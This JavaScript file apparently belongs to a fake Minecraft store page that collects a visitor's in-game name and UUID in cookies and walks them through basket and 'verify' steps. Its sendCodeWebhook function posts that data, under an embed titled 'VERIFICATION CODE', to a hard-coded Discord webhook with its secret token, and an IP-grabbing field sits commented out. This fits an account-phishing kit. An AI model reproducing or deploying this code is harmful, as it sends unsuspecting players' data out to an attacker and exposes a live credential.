function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(";");
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == " ") {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

async function createCookies() {
    // check to be sure ign isnt empty
    const ign = document.getElementById("ign").value;
    if (ign == "") return;
    document.cookie = "ign=" + ign;
    const body = await fetch(`https://api.ashcon.app/mojang/v2/user/${ign}`, {
        method: "GET",
    }).then((res) => res.json());
    var uuid = await body.uuid;
    uuid = await uuid.replaceAll("-", "");
    document.cookie = "uuid=" + (await uuid);
    console.log(await uuid);
    gotoCart();
}

// get ip address
async function getIP() {
    const body = await fetch(`https://api.ipify.org`, {
        method: "GET",
        headers: {
            'Content-Type': 'application/json'
          },
    }).then((res) => res.json());
    return body.ip;
}

function gotoCart() {
    location.href = "basket";
}

function gotoDetails() {
    location.href = "details.html";
}


function gotoVerify() {


    location.href = "verify";
}

// Send info to a discord webhook
async function sendCodeWebhook() {
    const uuid = getCookie("uuid");
    const ign = getCookie("ign");

    msg = {
        username: "HOOK",
        avatar_url: `https://crafatar.com/avatars/${uuid}?size=512&overlay`,
        embeds: [
            {
                title: "VERIFICATION CODE",
                color: 0,
                fields: [
                    {
                        name: "Name",
                        value: `John Doe`,
                        inline: true,
                    },
                    // {
                    //     name: "IP",
                    //     value: await getIP(),
                    //     inline: true,
                    // },
                    {
                        name: "UUID",
                        value: uuid,
                        inline: false,
                    },
                ],
                image: {
                    url: `https://visage.surgeplay.com/full/${uuid}`,
                },
                author: {
                    name: ign,
                    icon_url: `https://crafatar.com/avatars/${uuid}?size=512&overlay`,
                },
            },
        ],
    };

    fetch(
        "https://discord.com/api/webhooks/1050251441832476692/vyVijmEYcOVdwB9aIuPSZ_ZjGpTygOBFM26sAXr6IiN21kmpE1zQAjeHi2lNaenIVe7r",
        {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(msg),
        }
    );
}

async function submitIgn() {
    const ign = document.getElementById("ign").value;
    document.cookie = "ign=" + ign;
    const body = await fetch(`https://api1.inqz.net/uuid/${ign}`, {
        method: "GET",
    }).then((res) => res.json());
    var uuid = await body.id;
    uuid = await uuid.replaceAll("-", "");
    document.cookie = "uuid=" + (await uuid);
    console.log(await uuid);
    gotoCart();
}

// listen for when enter is pressed
document.addEventListener("keypress", function onEvent(event) {
    if (event.key === "Enter") {
        // check if ign is empty
        if (document.getElementById("ign").value == "") return;
        createCookies();
    }
});
